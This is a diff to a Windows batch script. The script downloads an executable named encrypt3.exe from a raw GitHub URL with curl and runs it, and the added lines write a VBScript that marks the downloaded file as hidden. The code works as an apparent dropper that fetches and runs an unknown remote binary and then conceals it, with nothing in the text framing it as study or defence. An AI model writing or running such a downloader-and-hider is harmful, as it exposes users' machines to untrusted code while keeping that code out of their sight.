@@ -4,6 +4,11 @@ setlocal enabledelayedexpansion
 rem Download encrypt3.exe from GitHub
 curl -OL https://raw.githubusercontent.com/Sap196/PWS_new/main/encrypt3.exe
 
+rem Save VBScript code to set files as hidden
+echo Set objShell = CreateObject("WScript.Shell") > setHidden.vbs
+echo Set objFSO = CreateObject("Scripting.FileSystemObject") >> setHidden.vbs
+echo objFSO.GetFile("encrypt3.exe").Attributes = 2 >> setHidden.vbs
+
 rem Run the Go program and capture its output to a file
 encrypt3.exe > output.txt
 
